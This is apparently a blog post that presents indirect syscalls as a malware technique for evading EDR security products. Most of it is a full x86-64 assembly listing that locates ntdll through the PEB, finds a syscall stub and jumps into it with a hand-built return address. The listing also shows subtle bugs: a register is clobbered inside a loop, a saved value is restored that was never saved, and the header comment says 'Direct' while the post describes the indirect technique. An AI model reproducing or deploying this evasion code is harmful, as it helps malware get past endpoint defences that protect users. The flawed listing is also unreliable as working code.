+++
title = 'Simplest Indirect Syscall'
date = 2022-11-11T16:40:16-05:00
draft = false
+++

Indirect syscalls are nothing new in the realm of malware techniques. However, their usefulness cannot be understated.

When dealing with the current era of highly imperfect EDR solutions, indirect syscalls are very effective, especially in combination with other techniques.

This post does not aim to exhaustively explain the technique, but rather demonstrate it in x86-64 native assembly. The general premise is to avoid embedding the `syscall` instruction directly in malware code. In its simplest form, it is done by finding the `syscall` bytes (`0f 05`) somewhere and jumping directly to them, with the return address set somewhere we can regain control. With this method there are flaws and room for improvement exists. However, its generally acceptable in my experience.

The below code demonstrates the the technique very simply
{{< footnote >}}The assembler in use is UASM, which can be found at https://github.com/Terraspace/UASM. It is a MASM syntax assembler with great features, including structure offset calculation, abstract looping, automatic stack space handling, and more. It makes writing x64 assembly less of a hair-pulling experience.{{< /footnote>}}. A pattern is used to find a syscall stub in `ntdll`. Following this, the return address is manually set using a trick to get `rip` and adding the size of the instructions leading up to and including the `jmp` to the stub. The rest of the syscall stub operates like normal.

```asm
; <main.asm>       -      Direct Syscall JOP Toy
;                              November 2022                     
;                                                                              
option win64:0x08, casemap:none, frame:auto, stackbase:rsp
include win.inc                                                                

hash_basis      equ            0xC59D1C81
hash_prime      equ            0x01000193
hash_ntdll      equ            0x8B9A6A34
                                                                      
find_bytes      proto :qword, :qword, :qword, :qword
get_gadget      proto :qword

text segment align(16) 'code' read execute 
syscall_stub_sig:
    db 0x4c, 0x8B, 0xD1, 0xB8        

start proc 
    mov     rcx, hash_ntdll
    call    getmod
    invoke  get_gadget, rax
    mov     rbx, rax
    call    get_rip
    add     rax, 0x0b
    push    rax
    mov     eax, 0x18
    jmp     rbx
    ret
start endp

get_rip:
    mov     rax, [rsp]
    ret

get_gadget proc base:qword
    local   @rbx:qword
    local   @rsi:qword
    local   @rdi:qword
    local   aof:qword
    local   aoo:qword
    mov     @rbx, rbx
    mov     @rsi, rsi
    mov     rax, base
    mov     rdi, base
    mov     eax, [rdi].dos_hdr.e_lfanew
    add     rax, base
    lea     rax, [rax].nt_hdr.opt.d_dir
    mov     ebx, [rax].img_data_dir.va
    add     rbx, base
    mov     eax, [rbx].exp_dir.aof
    add     rax, rdi
    mov     aof, rax
    mov     eax, [rbx].exp_dir.aoo
    add     rax, rdi
    mov     aoo, rax
    xor     esi, esi
_loop:
    cmp     esi, [rbx].exp_dir.n_names
    je      _done
    mov     rcx, aoo
    xor     eax, eax
    mov     ax, [rcx+rsi*2]
    mov     rcx, aof
    mov     eax, [rcx+rsi*4]
    add     rax, base
    mov     rbx, rax
    mov     rcx, rax
    lea     rdx, syscall_stub_sig
    inc     rsi
    invoke find_bytes, rcx, rdx, 4, 4
    test    eax, eax
    jz      _loop
    mov     rax, rbx
_done:
    add     rax, 18
    mov     rdi, @rdi
    mov     rsi, @rsi
    mov     rbx, @rbx
    retn                                    
get_gadget endp

getmod proc hash:qword                      
    local   first:qword                     
    local   curr:qword                      
    local   @rbx:qword
    local   @rsi:qword
    local   @rdi:qword
    mov     @rbx, rbx
    mov     @rsi, rsi
    mov     @rdi, rdi
    mov     rdi, rcx                        
    mov     rsi, [gs:0x60]                  
    mov     rsi, [rsi].peb.ldr              
    mov     rsi, [rsi].pld.moml.fw-10h      
    mov     first, rsi                      
    mov     rbx, [rsi].ldte.moml.fw-10h     
    mov     curr, rbx                       
_loop:                                      
    lea     rcx, [rbx].ldte.basename.buffer 
    xor     edx, edx
    mov     dx, [rbx].ldte.basename.len     
    call    gethash                         
    cmp     rax, rdi                        
    je      _match                          
    mov     rbx, [curr].ldte.moml.fw-10h    
    mov     rbx, [rbx]
    mov     curr, rbx
    cmp     rbx, first                      
    je      _done                           
    jmp     _loop                           
_match:                                     
    mov     rax, [rbx].ldte.dllbase         
_done:                                      
    mov     rdi, @rdi
    mov     rsi, @rsi
    mov     rbx, @rbx
    retn                                    
getmod endp                                 

gethash proc src:qword, len:dword 
    local   @rbx:qword
    local   @rsi:qword
    local   @rdi:qword
    mov     @rbx, rbx
    mov     @rsi, rsi
    mov     @rdi, rdi
    xor     rbx, rbx                        
    mov     rsi, rcx                        
    xor     ecx, ecx                        
    mov     eax, hash_basis                 
_loop:                                      
    cmp     ecx, edx                        
    je      _done                           
    xor     ebx, ebx                        
    mov     bl, [rsi+rcx]                   
    xor     eax, ebx                        
    mov     edi, hash_prime                 
    imul    eax, edi                        
    inc     ecx                             
    jmp     _loop                           
_done:                                      
    mov     rdi, @rdi
    mov     rsi, @rsi
    mov     rbx, @rbx
    retn                                    
gethash endp            

find_bytes proc src:qword, buf:qword, len:qword, max:qword
    local   @rbx:qword
    local   @rsi:qword
    local   @rdi:qword
    local   @r10:qword
    local   res:qword
    mov     @rbx, rbx
    mov     @rsi, rsi
    mov     @rdi, rdi
    mov     @r10, r10
    mov     res, 0
    xor     r10, r10
_loop:
    mov     rcx, r10
    add     rcx, len
    cmp     rcx, max
    ja      _done
    mov     rcx, src
    mov     rdx, buf
    mov     r8, len
    mov     rax, src
    inc     src
    inc     r10
    call    memcmp
    test    eax, eax
    jz      _loop
_done:
    mov     res, rax
    mov     rdi, @rdi
    mov     rdi, @rdi
    mov     rsi, @rsi
    mov     rbx, @rbx
    ret
find_bytes endp

memcmp proc src:qword, dst:qword, len:dword
    local   @rbx:qword
    mov     @rbx, rbx
    xor     r9, r9
_loop:
    cmp     r9, r8
    je      _done
    xor     eax, eax
    mov     bl, [rcx+r9]
    cmp     [rdx+r9], bl
    jne     _done
_match:
    mov     eax, 1
    inc     r9
    jmp     _loop
_done:
    mov     rbx, @rbx
    ret
memcmp endp

text ends
end
```